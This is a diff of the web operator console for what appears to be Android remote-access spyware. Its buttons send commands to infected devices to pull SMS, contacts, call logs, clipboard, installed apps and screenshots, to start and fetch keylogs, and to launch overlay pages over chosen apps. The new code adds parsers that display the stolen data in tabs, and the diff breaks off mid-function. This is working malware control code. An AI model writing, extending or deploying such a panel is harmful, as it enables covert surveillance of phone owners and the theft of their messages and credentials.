@@ -1,157 +1,186 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
+  <meta charset="utf-8" />
   <title>Device Control</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
-    body {
-      font-family: system-ui, sans-serif;
-      margin: 20px;
-      background: #f9fafb;
-      color: #111;
+    :root{
+      --bg:#071226;
+      --panel:#0b2230;
+      --muted:#b6c6d0;
+      --accent:#2b8cff;
+      --accent-2:#16a34a;
+      --card:#071f29;
+      --glass: rgba(255,255,255,0.03);
+      --radius:12px;
     }
-    h2 { margin-bottom: 4px; }
-    p { margin-top: 0; color: #555; }
-    .status {
-      font-size: 0.9em;
-      padding: 3px 8px;
-      border-radius: 5px;
-      display: inline-block;
-      margin-left: 10px;
-    }
-    .online { background: #d1fae5; color: #065f46; }
-    .offline { background: #fee2e2; color: #991b1b; }
-    button {
-      padding: 8px 12px;
-      border-radius: 6px;
-      border: none;
-      margin-right: 8px;
-      cursor: pointer;
-      color: #fff;
-      font-weight: 600;
-    }
-    .fetch { background: #10b981; }
-    .upload { background: #2563eb; }
-    .close { background: #ef4444; }
-    #log {
-      white-space: pre-wrap;
-      background: #fff;
-      border: 1px solid #eee;
-      padding: 10px;
-      border-radius: 8px;
-      margin-top: 10px;
-      min-height: 180px;
-      max-height: 70vh;
-      overflow: auto;
-      font-family: monospace;
-      font-size: 13px;
-    }
+    *{box-sizing:border-box}
+    html,body{height:100%;margin:0;font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial;color:var(--muted);background:linear-gradient(180deg,#051223 0%, #081827 100%);}
+    .app{display:grid;grid-template-columns:260px 1fr 340px;gap:18px;height:100vh;padding:18px;}
+    /* Sidebar */
+    .sidebar{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:var(--radius);padding:18px;border:1px solid rgba(255,255,255,0.03);display:flex;flex-direction:column;gap:12px;overflow:auto}
+    .logo{font-weight:700;color:var(--accent);font-size:18px}
+    .meta{font-size:13px;color:#9fb0bd}
+    .badge{padding:6px 10px;border-radius:999px;font-weight:700;font-size:13px;display:inline-block}
+    .offline{background:rgba(255,255,255,0.03);color:#7ea2b9}
+    .online{background:linear-gradient(90deg,#0ea5a4,#16a34a);color:white}
+    .group{margin-top:6px}
+    .group h4{margin:8px 0;color:#92b3c6;font-size:13px}
+    .btn{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));color:white;border:1px solid rgba(255,255,255,0.04);padding:10px 14px;border-radius:10px;font-weight:700;font-size:14px;cursor:pointer;min-width:120px;text-align:center;margin-bottom:8px}
+    .btn.ghost{background:transparent;border:1px solid rgba(255,255,255,0.03);color:var(--muted)}
+    .btn.green{background:linear-gradient(90deg,var(--accent-2),#059669)}
+    .btn.blue{background:linear-gradient(90deg,var(--accent),#1e40af)}
+    .btn.red{background:linear-gradient(90deg,#ef4444,#dc2626)}
+    .input{width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);background:rgba(255,255,255,0.02);color:var(--muted);font-size:14px}
+    /* main area */
+    .main{display:flex;flex-direction:column;gap:14px}
+    .header{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;border-radius:12px;background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.015));border:1px solid rgba(255,255,255,0.02);}
+    .title{font-weight:700;color:#87c0ff}
+    .clientInfo{color:#a8c3d6}
+    .content{display:grid;grid-template-columns:1fr;gap:18px;align-items:start}
+    .card{background:var(--panel);border-radius:12px;padding:16px;border:1px solid rgba(255,255,255,0.02);min-height:420px}
+    .tabs{display:flex;gap:12px;margin-bottom:12px;flex-wrap:wrap}
+    .tab{padding:8px 12px;border-radius:999px;background:rgba(255,255,255,0.01);color:#9fb0bd;font-weight:700;cursor:pointer}
+    .tab.active{background:linear-gradient(90deg,#183648,#0f3a4a);color:#bfe6ff}
+    /* log */
+    #log{background:#071a21;border-radius:10px;padding:14px;height:420px;overflow:auto;font-family:monospace;color:#9fb0bd;font-size:13px;white-space:pre-wrap}
+    /* right column */
+    .rightPanel{background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.02));border-radius:12px;padding:16px;border:1px solid rgba(255,255,255,0.02);height:calc(100vh - 36px);overflow:auto}
+    .shotsGrid{display:grid;grid-template-columns:1fr;gap:12px}
+    .shot{background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.015));padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.02);display:flex;flex-direction:column;gap:8px}
+    .shot img{width:100%;height:auto;border-radius:8px;object-fit:cover}
+    .smallMuted{font-size:12px;color:#8ea3b4}
+    /* lists */
+    .list{display:flex;flex-direction:column;gap:8px;max-height:380px;overflow:auto;padding-right:6px}
+    .listItem{background:rgba(255,255,255,0.01);border-radius:8px;padding:10px;border:1px solid rgba(255,255,255,0.02);display:flex;justify-content:space-between;gap:12px;align-items:center}
+    .listItem pre{margin:0;font-family:monospace;font-size:13px;color:#cfe9ff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .loading{opacity:0.9;font-style:italic;color:#9fb0bd}
+    /* responsive */
+    @media (max-width: 1000px){.app{grid-template-columns:1fr;grid-template-rows:auto 1fr auto;padding:12px}.rightPanel{order:3;height:auto}.sidebar{order:1}.main{order:2}}
   </style>
-  
-  
-  <style>
-  #screenshotsContainer {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
-    gap: 16px;
-    margin-top: 10px;
-  }
-
-  .shotItem {
-    background: #fafafa;
-    border: 1px solid #ccc;
-    padding: 10px;
-    border-radius: 8px;
-    text-align: center;
-  }
-
-  .shotItem img {
-    max-width: 100%;
-    height: auto;
-    border-radius: 6px;
-    cursor: zoom-in;
-  }
-
-  .shotItem button {
-    margin-top: 10px;
-    padding: 6px 10px;
-    background: #2563eb;
-    color: #fff;
-    border: none;
-    border-radius: 6px;
-    cursor: pointer;
-    font-weight: 600;
-    width: 100%;
-  }
-</style>
-
-  
-  
 </head>
 <body>
-  <h2 id="devName"></h2>
-  <p>ID: <span id="devId"></span> 
-     <span id="status" class="status offline">Offline</span>
-  </p>
+  <div class="app">
+    <!-- LEFT SIDEBAR -->
+    <aside class="sidebar">
+      <div>
+        <div class="logo">Device</div>
+        <div style="height:8px"></div>
+        <div class="meta">ID: <span id="devId">unknown</span></div>
+        <div style="height:6px"></div>
+        <div><span id="status" class="badge offline">Offline</span></div>
+      </div>
 
-  <button class="fetch" id="btnFetch">Fetch Notification</button>
-  <button class="fetch" id="btnStartNotify">Start Notification Listener</button>
-  <button class="close" id="btnStopNotify">Stop Notification Listener</button>
-  <button class="fetch" id="btnFetchSms">Fetch Sms</button>
-  <button class="fetch" id="btnFetchContact">Fetch Contact</button>
-  <button class="fetch" id="btnFetchLog">Fetch Call Logs</button>
-  <button class="fetch" id="btnFetchApps">Fetch Installed Apps</button>
-  <button class="fetch" id="btnFetchIp">Fetch Ip Address</button>
-  <button class="fetch" id="btnFetchClip">Fetch ClipBoard</button>
-  <button class="fetch" id="btnStartKeyLog">Start KeyLogs</button>
-  <button class="close" id="btnStopKeyLog">Stop KeyLogs</button>
-  <button class="fetch" id="btnFetchKeyLog">Fetch KeyLogs</button>
-  <button class="fetch" id="btnFetchDevice">Fetch Device Info</button>
-  <button class="fetch" id="btnFetchScreenshot">Fetch Screenshot</button>
-  <button class="fetch" id="btnFetchScreenshotPermission">Fetch Screenshot Permission</button>
-  <button class="upload" id="btnUpload">Upload</button>
-  
-  <!-- Overlay Control Section -->
-<div style="margin-top: 20px; padding: 10px; background: #fff; border-radius: 8px; border: 1px solid #eee;">
-  <h3>Overlay Launcher</h3>
-  
-  <label>
-    Package Name:
-    <input id="pkgInput" type="text" placeholder="e.g. com.google.android.youtube" 
-           style="width: 300px; padding: 6px; margin-bottom: 6px;">
-  </label>
-  <br>
-  
-  <label>
-    URL:
-    <input id="urlInput" type="text" placeholder="e.g. https://google.com"
-           style="width: 300px; padding: 6px; margin-bottom: 6px;">
-  </label>
-  <br>
-  
-  <button class="fetch" id="btnCustomOverlay">Start Overlay (Custom)</button>
-  <button class="close" id="btnStopOverlay">Stop Overlay</button>
-</div>
+      <div class="group">
+        <h4>Quick actions</h4>
+        <button id="btnFetch" class="btn blue">Fetch Notification</button>
+        <button id="btnStartNotify" class="btn green">Start Notify</button>
+        <button id="btnStopNotify" class="btn ghost">Stop Notify</button>
 
-  
-  
-  <button class="close" id="btnClose">Close</button>
-  
-  
-  <div id="screenshotsContainer"></div>
+        <button id="btnFetchSms" class="btn">Fetch SMS</button>
+        <button id="btnFetchContact" class="btn">Fetch Contacts</button>
+        <button id="btnFetchLog" class="btn">Fetch Calls</button>
+        <button id="btnFetchApps" class="btn">Fetch Installed Apps</button>
+        <button id="btnFetchDevice" class="btn">Device Info</button>
+        <button id="btnFetchScreenshot" class="btn">Fetch Screenshot</button>
+        <button id="btnFetchScreenshotPermission" class="btn">Grant Screenshot Permission</button>
+      </div>
 
- 
+      <div class="group">
+        <h4>Overlay</h4>
+        <label style="font-size:13px;color:#8ea3b4">Package</label>
+        <input id="pkgInput" class="input" placeholder="com.example.app" />
+        <label style="font-size:13px;color:#8ea3b4">URL</label>
+        <input id="urlInput" class="input" placeholder="https://..." />
+        <div style="display:flex;gap:8px;margin-top:8px">
+          <button id="btnCustomOverlay" class="btn blue">Start Overlay</button>
+          <button id="btnStopOverlay" class="btn ghost">Stop Overlay</button>
+        </div>
+      </div>
 
+      <div style="margin-top:auto;display:flex;flex-direction:column;gap:8px">
+        <button id="btnUpload" class="btn blue">Upload</button>
+        <button id="btnClose" class="btn red">Close</button>
+      </div>
+    </aside>
 
-  <pre id="log">Connecting...</pre>
-  
- 
+    <!-- MAIN -->
+    <main class="main">
+      <div class="header">
+        <div>
+          <div class="title">Live Device Console</div>
+          <div class="clientInfo">Client: <span id="devName">unknown</span></div>
+        </div>
+        <div style="display:flex;gap:12px;align-items:center">
+          <div style="font-size:13px;color:#90b1c6">Status</div>
+          <div id="statusSmall" class="badge offline">Offline</div>
+        </div>
+      </div>
+
+      <div class="content">
+        <section class="card">
+          <div class="tabs" role="tablist" aria-label="Console tabs">
+            <div class="tab active" data-tab="logs">Logs</div>
+            <div class="tab" data-tab="apps">Apps</div>
+            <div class="tab" data-tab="sms">SMS</div>
+            <div class="tab" data-tab="contacts">Contacts</div>
+            <div class="tab" data-tab="calls">Calls</div>
+            <div class="tab" data-tab="screenshots">Screenshots</div>
+          </div>
+
+          <!-- LOGS -->
+          <div id="tab-logs" class="tabPanel">
+            <div id="log">Connecting...</div>
+          </div>
+
+          <!-- APPS -->
+          <div id="tab-apps" class="tabPanel" style="display:none">
+            <div id="appsLoading" class="loading" style="display:none">Loading apps...</div>
+            <div id="appsList" class="list"></div>
+          </div>
+
+          <!-- SMS -->
+          <div id="tab-sms" class="tabPanel" style="display:none">
+            <div id="smsLoading" class="loading" style="display:none">Loading SMS...</div>
+            <div id="smsList" class="list"></div>
+          </div>
+
+          <!-- CONTACTS -->
+          <div id="tab-contacts" class="tabPanel" style="display:none">
+            <div id="contactsLoading" class="loading" style="display:none">Loading contacts...</div>
+            <div id="contactsList" class="list"></div>
+          </div>
+
+          <!-- CALLS -->
+          <div id="tab-calls" class="tabPanel" style="display:none">
+            <div id="callsLoading" class="loading" style="display:none">Loading calls...</div>
+            <div id="callsList" class="list"></div>
+          </div>
+
+          <!-- SCREENSHOTS (main center area also shows thumbnails) -->
+          <div id="tab-screenshots" class="tabPanel" style="display:none">
+            <div id="shotsLoading" class="loading" style="display:none">Loading screenshots...</div>
+            <div id="screenshotsCenter" class="shotsGrid"></div>
+          </div>
+        </section>
+      </div>
+    </main>
+
+    <!-- RIGHT RAIL -->
+    <aside class="rightPanel">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+        <div style="font-weight:700;color:#dbefff">Screenshots</div>
+        <div class="smallMuted">Auto saved</div>
+      </div>
+      <div id="screenshotsContainer" class="shotsGrid"></div>
+    </aside>
+  </div>
 
   <script>
     // --- Extract device info from URL ---
     const pathParts = window.location.pathname.split("/");
-    const clientId = pathParts[pathParts.length - 1];
+    const clientId = pathParts[pathParts.length - 1] || "unknown";
     const urlParams = new URLSearchParams(location.search);
     const deviceName = decodeURIComponent(urlParams.get("name") || clientId);
 
@@ -159,8 +188,34 @@
     document.getElementById("devName").textContent = deviceName;
     document.getElementById("devId").textContent = clientId;
 
+    // --- Elements ---
     const logEl = document.getElementById("log");
     const statusEl = document.getElementById("status");
+    const statusSmallEl = document.getElementById("statusSmall");
+    const tabs = Array.from(document.querySelectorAll(".tab"));
+    const tabPanels = {
+      logs: document.getElementById("tab-logs"),
+      apps: document.getElementById("tab-apps"),
+      sms: document.getElementById("tab-sms"),
+      contacts: document.getElementById("tab-contacts"),
+      calls: document.getElementById("tab-calls"),
+      screenshots: document.getElementById("tab-screenshots")
+    };
+
+    // lists
+    const appsList = document.getElementById("appsList");
+    const smsList = document.getElementById("smsList");
+    const contactsList = document.getElementById("contactsList");
+    const callsList = document.getElementById("callsList");
+    const screenshotsContainer = document.getElementById("screenshotsContainer");
+    const screenshotsCenter = document.getElementById("screenshotsCenter");
+
+    // loading indicators
+    const appsLoading = document.getElementById("appsLoading");
+    const smsLoading = document.getElementById("smsLoading");
+    const contactsLoading = document.getElementById("contactsLoading");
+    const callsLoading = document.getElementById("callsLoading");
+    const shotsLoading = document.getElementById("shotsLoading");
 
     function pushLog(msg) {
       const ts = new Date().toLocaleTimeString();
@@ -168,7 +223,7 @@
       logEl.scrollTop = logEl.scrollHeight;
     }
 
-    // --- Command sending ---
+    // --- send command ---
     async function sendCmd(cmd) {
       pushLog(`📤 Sending "${cmd}"...`);
       try {
@@ -178,51 +233,72 @@
           body: JSON.stringify({ targetClientId: clientId, command: cmd })
         });
         if (!r.ok) pushLog(`❌ Failed: ${r.status}`);
-        else pushLog(`✅ Command sent (${cmd})`);
+        else pushLog(`✅ Command queued (${cmd})`);
       } catch (e) {
         pushLog(`⚠️ Network error: ${e.message}`);
       }
     }
 
-    document.getElementById("btnFetch").onclick = () => sendCmd("fetch");
-    document.getElementById("btnStartNotify").onclick = () => sendCmd("start-notify");
-    document.getElementById("btnStopNotify").onclick = () => sendCmd("stop-notify");
-    document.getElementById("btnFetchSms").onclick = () => sendCmd("fetch-sms");
-    document.getElementById("btnFetchContact").onclick = () => sendCmd("fetch-contact");
-    document.getElementById("btnFetchLog").onclick = () => sendCmd("fetch-logs");
-    document.getElementById("btnFetchApps").onclick = () => sendCmd("fetch-apps");
-    document.getElementById("btnFetchIp").onclick = () => sendCmd("fetch-ip");
-    document.getElementById("btnFetchClip").onclick = () => sendCmd("fetch-clip");
-    document.getElementById("btnStartKeyLog").onclick = () => sendCmd("start_keylog");
-    document.getElementById("btnStopKeyLog").onclick = () => sendCmd("stop_keylog");
-    document.getElementById("btnFetchKeyLog").onclick = () => sendCmd("fetch_keylog");
-    document.getElementById("btnFetchDevice").onclick = () => sendCmd("fetch-device");
-    document.getElementById("btnFetchScreenshot").onclick = () => sendCmd("fetch-screenshot");
-    document.getElementById("btnFetchScreenshotPermission").onclick = () => sendCmd("grant-screenshot-permission");
-    document.getElementById("btnUpload").onclick = () => sendCmd("upload");
-    document.getElementById("btnClose").onclick = () => window.close();
-	
-	
-	
-	// ---- Custom Overlay Controls ----
-	document.getElementById("btnCustomOverlay").onclick = () => {
-	const pkg = document.getElementById("pkgInput").value.trim();
-	const url = document.getElementById("urlInput").value.trim();
+    // map buttons to commands + auto-tab behavior
+    const buttonMap = {
+      btnFetch: { cmd: "fetch", tab: "logs" },
+      btnStartNotify: { cmd: "start-notify", tab: "logs" },
+      btnStopNotify: { cmd: "stop-notify", tab: "logs" },
+      btnFetchSms: { cmd: "fetch-sms", tab: "sms", loader: smsLoading },
+      btnFetchContact: { cmd: "fetch-contact", tab: "contacts", loader: contactsLoading },
+      btnFetchLog: { cmd: "fetch-logs", tab: "calls", loader: callsLoading },
+      btnFetchApps: { cmd: "fetch-apps", tab: "apps", loader: appsLoading },
+      btnFetchIp: { cmd: "fetch-ip", tab: "logs" },
+      btnFetchClip: { cmd: "fetch-clip", tab: "logs" },
+      btnStartKeyLog: { cmd: "start_keylog", tab: "logs" },
+      btnStopKeyLog: { cmd: "stop_keylog", tab: "logs" },
+      btnFetchKeyLog: { cmd: "fetch_keylog", tab: "logs" },
+      btnFetchDevice: { cmd: "fetch-device", tab: "logs" },
+      btnFetchScreenshot: { cmd: "fetch-screenshot", tab: "screenshots", loader: shotsLoading },
+      btnFetchScreenshotPermission: { cmd: "grant-screenshot-permission", tab: "logs" },
+      btnUpload: { cmd: "upload", tab: "logs" },
+      btnCustomOverlay: { cmd: null, tab: "logs" }, // custom handled below
+      btnStopOverlay: { cmd: "stop-overlay", tab: "logs" }
+    };
 
-	if (!pkg || !url) {
-		pushLog("⚠️ Please enter both PackageName and URL");
-		return;
-	}
+    // attach listeners for mapped buttons
+    Object.keys(buttonMap).forEach(id => {
+      const el = document.getElementById(id);
+      if (!el) return;
+      el.addEventListener("click", () => {
+        const map = buttonMap[id];
+        // custom overlay button uses inputs
+        if (id === "btnCustomOverlay") {
+          const pkg = document.getElementById("pkgInput").value.trim();
+          const url = document.getElementById("urlInput").value.trim();
+          if (!pkg || !url) { pushLog("⚠️ Please enter both Package and URL"); return; }
+          const cmd = `start-overlay{url:${url},PackageName:${pkg}}`;
+          showTab(map.tab || "logs"); sendCmd(cmd);
+          return;
+        }
+        if (map.loader) {
+          map.loader.style.display = "block";
+        }
+        if (map.tab) showTab(map.tab);
+        if (map.cmd) sendCmd(map.cmd);
+      });
+    });
 
-	const cmd = `start-overlay{url:${url},PackageName:${pkg}}`;
-	sendCmd(cmd);
-	};
+    document.getElementById("btnClose")?.addEventListener("click", ()=> window.close());
 
-	document.getElementById("btnStopOverlay").onclick = () => {
-	sendCmd("stop-overlay");
-	};
-
-
+    // tab switching
+    function showTab(name) {
+      // set tabs UI
+      tabs.forEach(t => {
+        if (t.dataset.tab === name) t.classList.add("active");
+        else t.classList.remove("active");
+      });
+      // show panels
+      Object.keys(tabPanels).forEach(k => {
+        tabPanels[k].style.display = (k === name ? "" : "none");
+      });
+    }
+    tabs.forEach(t => t.addEventListener("click", ()=> showTab(t.dataset.tab)));
 
     // --- WebSocket for live updates ---
     const wsProto = location.protocol === "https:" ? "wss://" : "ws://";
@@ -232,98 +308,292 @@
     ws.onclose = () => pushLog("❌ WebSocket disconnected");
     ws.onerror = (e) => pushLog("⚠️ WebSocket error");
 
-    ws.onmessage = (evt) => {
-      try {
-        const msg = JSON.parse(evt.data);
+    // chunk assembly storage
+    const chunkBuffer = new Map();
+    // key: `${clientId}|${tagId}` -> { total:int, parts:[], received:int, lastTs:Date }
 
-        if (msg.type === "devices") {
-          // Update online/offline status of this device
-          const d = msg.devices[clientId];
-          if (d && d.online) {
-            statusEl.textContent = "Online";
-            statusEl.className = "status online";
-          } else {
-            statusEl.textContent = "Offline";
-            statusEl.className = "status offline";
-          }
-        }
+    // utility: attempt to parse JSON safely
+    function tryParseJSON(text) {
+      try { return JSON.parse(text); } catch(e){ return null; }
+    }
 
-       if (msg.type === "response" && msg.clientId === clientId) {
-			pushLog(`📩 Response: ${msg.output}`);
+    function normalizeAppEntry(a) {
+      // handle different shapes of app entries
+      if (typeof a === "string") return { label: a, pkg: a };
+      if (a.packageName) return { label: a.label || a.packageName, pkg: a.packageName };
+      if (a.package) return { label: a.name || a.package, pkg: a.package };
+      if (a.appName) return { label: a.appName, pkg: a.pkg || a.package || "" };
+      return { label: a.name || a.label || JSON.stringify(a), pkg: a.package || a.pkg || "" };
+    }
 
-    if (msg.output.includes("supabase.co")) {
+    // rendering functions
+    function renderApps(arr) {
+      appsLoading.style.display = "none";
+      appsList.innerHTML = "";
+      if (!arr || !arr.length) { appsList.innerHTML = "<div class='smallMuted'>No apps received</div>"; return; }
+      arr.forEach(a => {
+        const n = normalizeAppEntry(a);
+        const item = document.createElement("div"); item.className = "listItem";
+        const left = document.createElement("div"); left.style.flex = "1";
+        const title = document.createElement("pre"); title.textContent = n.label;
+        left.appendChild(title);
+        const right = document.createElement("div"); right.style.minWidth = "160px"; right.style.textAlign = "right";
+        const pkgEl = document.createElement("div"); pkgEl.className = "smallMuted"; pkgEl.textContent = n.pkg;
+        right.appendChild(pkgEl);
+        item.appendChild(left); item.appendChild(right);
+        appsList.appendChild(item);
+      });
+    }
 
-        const url = msg.output.trim();
-        const container = document.getElementById("screenshotsContainer");
+    function renderSms(arr) {
+      smsLoading.style.display = "none";
+      smsList.innerHTML = "";
+      if (!arr || !arr.length) { smsList.innerHTML = "<div class='smallMuted'>No SMS received</div>"; return; }
+      arr.forEach(s => {
+        const item = document.createElement("div"); item.className = "listItem";
+        const left = document.createElement("div"); left.style.flex = "1";
+        const who = document.createElement("div"); who.textContent = s.address || s.from || s.sender || "Unknown";
+        who.style.fontWeight = "700"; who.style.marginBottom = "6px";
+        const body = document.createElement("pre"); body.textContent = s.body || s.message || s.text || JSON.stringify(s);
+        left.appendChild(who); left.appendChild(body);
+        const right = document.createElement("div"); right.className = "smallMuted"; right.textContent = new Date(s.date || s.timestamp || Date.now()).toLocaleString();
+        item.appendChild(left); item.appendChild(right);
+        smsList.appendChild(item);
+      });
+    }
 
-        // Create wrapper for each screenshot
-        const item = document.createElement("div");
-		item.className = "shotItem";
+    function renderContacts(arr) {
+      contactsLoading.style.display = "none";
+      contactsList.innerHTML = "";
+      if (!arr || !arr.length) { contactsList.innerHTML = "<div class='smallMuted'>No contacts received</div>"; return; }
+      arr.forEach(c => {
+        const item = document.createElement("div"); item.className = "listItem";
+        const left = document.createElement("div"); left.style.flex = "1";
+        const name = document.createElement("div"); name.textContent = c.name || c.displayName || c.fullName || JSON.stringify(c); name.style.fontWeight = "700";
+        const detail = document.createElement("div"); detail.className = "smallMuted"; detail.textContent = (c.phone || c.number || (c.phones && c.phones.join(", ")) || "");
+        left.appendChild(name); left.appendChild(detail);
+        item.appendChild(left);
+        contactsList.appendChild(item);
+      });
+    }
 
+    function renderCalls(arr) {
+      callsLoading.style.display = "none";
+      callsList.innerHTML = "";
+      if (!arr || !arr.length) { callsList.innerHTML = "<div class='smallMuted'>No call logs received</div>"; return; }
+      arr.forEach(c => {
+        const item = document.createElement("div"); item.className = "listItem";
+        const left = document.createElement("div"); left.style.flex = "1";
+        const who = document.createElement("div"); who.textContent = c.name || c.number || "Unknown"; who.style.fontWeight = "700";
+        const detail = document.createElement("pre"); detail.textContent = (c.type ? `${c.type} • ` : "") + (c.duration ? `${c.duration}s • ` : "") + (c.timestamp ? new Date(c.timestamp).toLocaleString() : "");
+        left.appendChild(who); left.appendChild(detail);
+        item.appendChild(left);
+        callsList.appendChild(item);
+      });
+    }
 
-        // Timestamp
-        const d = new Date();
-        const stampDisplay = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()} ${d.getHours()}:${d.getMinutes()}:${d.getSeconds()}`;
-        const stampFile = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()}_${d.getHours()}-${d.getMinutes()}-${d.getSeconds()}`;
-
-        const label = document.createElement("div");
-        label.innerText = `Captured: ${stampDisplay}`;
-        label.style.marginBottom = "8px";
-        label.style.fontSize = "13px";
-        label.style.color = "#555";
-
-        // The image
-        const img = document.createElement("img");
-        img.src = url;
-        img.style.width = "120px";
-        img.style.height = "200px";
-        img.style.cursor = "zoom-in";
-        img.style.display = "block";
-        img.style.marginBottom = "10px";
-
-        // Zoom on click
-        img.onclick = () => {
-            const win = window.open("", "_blank");
-            win.document.write(`<center><img src="${url}" style="width:243px;height:498px;"></center>`);
-        };
-
-        // Download button
-        const downloadBtn = document.createElement("button");
-        downloadBtn.innerText = "Download";
-        downloadBtn.style.padding = "6px 12px";
-        downloadBtn.style.cursor = "pointer";
-
-        downloadBtn.onclick = async () => {
+    function renderScreenshots(urls) {
+      shotsLoading.style.display = "none";
+      if (!Array.isArray(urls)) urls = [urls];
+      // center (card) and right column
+      urls.forEach(url => {
+        const item = document.createElement("div"); item.className = "shot";
+        const img = document.createElement("img"); img.src = url; img.alt = "screenshot";
+        img.onclick = ()=> { window.open(url, "_blank"); };
+        const meta = document.createElement("div"); meta.className = "smallMuted"; meta.textContent = new Date().toLocaleString();
+        const dl = document.createElement("button"); dl.className = "btn ghost"; dl.textContent = "Download";
+        dl.addEventListener("click", async ()=> {
+          try {
             const res = await fetch(url);
             const blob = await res.blob();
             const blobUrl = URL.createObjectURL(blob);
-
-            const link = document.createElement("a");
-            link.href = blobUrl;
-            link.download = `screenshot_${stampFile}.jpg`;
-            document.body.appendChild(link);
-            link.click();
-            link.remove();
-            URL.revokeObjectURL(blobUrl);
-        };
-
-        // Add to container
-        item.appendChild(label);
-        item.appendChild(img);
-        item.appendChild(downloadBtn);
-
-        container.appendChild(item);
+            const a = document.createElement("a"); a.href = blobUrl; a.download = `screenshot.jpg`; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(blobUrl);
+          } catch(e){ pushLog("⚠️ Download failed: "+e.message); }
+        });
+        item.appendChild(img); item.appendChild(meta); item.appendChild(dl);
+        // prepend to both containers
+        screenshotsContainer.prepend(item.cloneNode(true));
+        screenshotsCenter.prepend(item);
+      });
     }
-}
 
+    // attempt to intelligently route parsed payload to a renderer
+    function routeParsedPayload(obj) {
+      // if it's an object with top-level keys
+      if (!obj) return false;
+      if (Array.isArray(obj)) {
+        // array — guess type by inspecting first element
+        const first = obj[0];
+        if (!first) return false;
+        if (first.packageName || first.package || typeof first === "string") { renderApps(obj); showTab("apps"); return true; }
+        if (first.address || first.body || first.sender) { renderSms(obj); showTab("sms"); return true; }
+        if (first.number || first.type || first.duration) { renderCalls(obj); showTab("calls"); return true; }
+        if (first.name && (first.phone || first.phones)) { renderContacts(obj); showTab("contacts"); return true; }
+        // fallback: append to logs
+        pushLog("📦 Received array payload (unknown): " + JSON.stringify(obj));
+        return false;
+      } else if (typeof obj === "object") {
+        // check known keys
+        if (obj.apps || obj.installedApps || obj.packages) {
+          const apps = obj.apps || obj.installedApps || obj.packages;
+          renderApps(apps);
+          showTab("apps");
+          return true;
+        }
+        if (obj.sms || obj.messages) {
+          const sms = obj.sms || obj.messages;
+          renderSms(sms);
+          showTab("sms");
+          return true;
+        }
+        if (obj.contacts || obj.people) {
+          const contacts = obj.contacts || obj.people;
+          renderContacts(contacts);
+          showTab("contacts");
+          return true;
+        }
+        if (obj.calls || obj.callLogs) {
+          const calls = obj.calls || obj.callLogs;
+          renderCalls(calls);
+          showTab("calls");
+          return true;
+        }
+        if (obj.screenshots || obj.images) {
+          const shots = obj.screenshots || obj.images;
+          renderScreenshots(shots);
+          showTab("screenshots");
+          return true;
+        }
+        // unknown structured object — show in logs
+        pushLog("📦 Received object payload: " + JSON.stringify(obj));
+        return false;
+      }
+      return false;
+    }
 
+    // --- Handle incoming ws messages (including chunk handling) ---
+    ws.onmessage = (evt) => {
+      try {
+        const msg = JSON.parse(evt.data);
+        // device status updates
+        if (msg.type === "devices") {
+          const d = msg.devices?.[clientId];
+          if (d && d.online) {
+            statusEl.textContent = "Online"; statusEl.className = "badge online";
+            statusSmallEl.textContent = "Online"; statusSmallEl.className = "badge online";
+          } else {
+            statusEl.textContent = "Offline"; statusEl.className = "badge offline";
+            statusSmallEl.textContent = "Offline"; statusSmallEl.className = "badge offline";
+          }
+          return;
+        }
 
+        // responses
+        if (msg.type === "response" && msg.clientId === clientId) {
+          const raw = (typeof msg.output === "string") ? msg.output : String(msg.output || "");
+          pushLog(`📩 Response chunk: ${raw.substring(0,200)}`);
+
+          // check chunk pattern: "[<tag> chunk X/Y]\n<content>"
+          // pattern groups: tag, index, total, content
+          const chunkRegex = /^\[(.+?)\s+chunk\s+(\d+)\/(\d+)\]\s*\n([\s\S]*)$/i;
+          const m = raw.match(chunkRegex);
+          if (m) {
+            const tag = m[1].trim(); // usually deviceName but may contain command info
+            const idx = parseInt(m[2], 10);
+            const total = parseInt(m[3], 10);
+            const content = m[4] || "";
+
+            const key = clientId + "|" + tag;
+            let entry = chunkBuffer.get(key);
+            if (!entry) {
+              entry = { total: total, parts: new Array(total).fill(null), received: 0, lastTs: Date.now() };
+              chunkBuffer.set(key, entry);
+            }
+            // store at correct position (index-1)
+            if (!entry.parts[idx-1]) {
+              entry.parts[idx-1] = content;
+              entry.received++;
+              entry.lastTs = Date.now();
+            }
+
+            // if complete assemble
+            if (entry.received === entry.total) {
+              const assembled = entry.parts.join("");
+              chunkBuffer.delete(key);
+              handleAssembledPayload(assembled);
+            } else {
+              pushLog(`🔁 Received chunk ${idx}/${total} for ${tag} (${entry.received}/${entry.total})`);
+            }
+          } else {
+            // not chunked — try parse directly (or maybe contains JSON string)
+            handleAssembledPayload(raw);
+          }
+        }
       } catch (e) {
         console.error("WS parse error", e);
       }
     };
 
+    // called when we have a complete payload (either single message or assembled)
+    function handleAssembledPayload(text) {
+      // trim and attempt to extract JSON body if wrapped or prefixed
+      const trimmed = text.trim();
+      // try direct JSON parse
+      const parsed = tryParseJSON(trimmed);
+      if (parsed !== null) {
+        const routed = routeParsedPayload(parsed);
+        if (!routed) pushLog("ℹ️ Parsed JSON but could not route automatically.");
+        return;
+      }
+
+      // sometimes payload may contain lines with metadata and then JSON — try to locate first "{" or "[" 
+      const idxObj = trimmed.indexOf("{");
+      const idxArr = trimmed.indexOf("[");
+      let pick = -1;
+      if (idxObj === -1) pick = idxArr;
+      else if (idxArr === -1) pick = idxObj;
